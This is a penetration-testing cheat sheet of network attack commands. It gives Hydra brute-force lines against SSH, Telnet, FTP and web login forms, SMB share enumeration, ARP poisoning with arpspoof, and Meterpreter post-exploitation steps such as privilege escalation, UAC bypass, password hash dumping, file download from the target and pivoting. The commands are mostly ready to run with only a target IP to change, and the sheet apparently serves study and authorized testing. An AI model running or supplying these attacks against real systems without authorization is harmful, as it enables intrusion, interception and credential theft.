---
description: 'SSH, Telnet, RDP, HTTP auth, Windows shares'
---

# Network Attacks

## Hydra <a id="hydra"></a>

### SSH <a id="ssh"></a>

```text
hydra -L users.txt -P pass.txt 10 10.10.10.10 ssh
```

### Telnet <a id="telnet"></a>

```text
hydra -L users.txt -P pass.txt telnet://10.10.10.10
```

### FTP <a id="ftp"></a>

```text
hydra -L users.txt -P pass.txt ftp://10.10.10.10
```

### POST form login <a id="post-form-login"></a>

```text
hydra 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:statement for incorrect login" -L /usr/share/ncrack/minimal.usr -P /etc/john/rockyou.txt
```

Add`-f` to stop the brute-forcing after finding one valid cred.

* /etc/john/rockyou.txt for passwords.
* /usr/share/ncrack/minimal.usr for users.
* Sometimes you can just use the users list for the passwords too.

## Shares

### Shares Enumeration

```text
nmblookup -A 10.10.10.10
```

### List Shares

```text
smbclient -L //10.10.10.10 -N
```

### Mount Share

```text
smbclient //10.10.10.10/sharename -N
```

### enum4linux <a id="enum-4-linux"></a>

```text
enum4linux -a 10.10.10.10
```

The above command does all the previous ones and gives you more data too except mounting the shares, which you have to implement using smbclient.

## ARP Poisoning <a id="arp-poisoning"></a>

### arpspoof <a id="arpspoof"></a>

&lt;interface&gt; == eth0/tap0

```text
arpspoof -i <interface> -t target -r host
```

## Metasploit

### Basic <a id="basic"></a>

```text
search <term>
use <term>
info
show options
set <option> x
exploit
```

### Meterpreter <a id="meterpreter"></a>

**bind\_tcp**: runs a server process on the target machine that waits for connections from the attacker machine.

**reverse\_tcp**: performs a TCP connection back to the attacker machine. Helps evade firewall rules.

```text
background #backgrounds the current session
sessions -l
sessions -i %n
sysinfo
ifconfig, route
getuid
getsystem #windows privesc
bypassuac #if windows privesc fails
hashdump
cat '/path/to/file.txt'
download '/path/to/fileontarget.txt' /root/mymachine/
```

### Routing in Metasploit

Background the meterpreter of the session where you found the other subnet accessible.

```text
use post/multi/manage/autoroute
route add <subnet> <session-id>
```

You have to input the session id of the meterpreter session.

Now the subnet is accessible in the whole of Metasploit-Framework.

